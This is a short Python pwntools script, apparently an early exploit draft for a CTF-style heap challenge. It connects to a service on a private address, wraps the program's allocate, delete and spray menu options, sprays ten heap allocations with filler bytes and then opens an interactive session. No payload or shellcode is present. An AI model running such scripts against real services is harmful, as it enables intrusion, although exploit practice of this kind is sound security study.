from pwn import *

s = remote("192.168.0.85",1234)
def alloc(idx, rdata, wdata):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('idx?')
  s.sendline(str(idx))
  s.send(rdata)
  s.send(wdata)
def delete(idx):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil('idx?')
  s.sendline(str(idx))
def spray(rdata,wdata):
  s.recvuntil('>')
  s.sendline('5')
  s.send(rdata)
  s.send(wdata)
alloc(0,'A'*256,'B'*16)
for i in range(10):
  spray('A'*256,'B'*16)
s.interactive()
